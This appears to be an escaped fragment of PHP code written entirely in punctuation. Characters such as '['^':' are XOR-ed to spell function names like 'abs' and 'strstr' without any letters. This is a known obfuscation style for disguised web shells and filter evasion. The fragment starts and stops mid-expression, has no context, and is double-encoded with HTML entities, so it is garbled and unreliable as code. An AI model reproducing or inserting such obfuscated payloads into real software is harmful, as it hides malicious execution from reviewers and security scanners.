\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))):(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)),(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),[(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))])?(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))))),(\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)).(\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))?(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))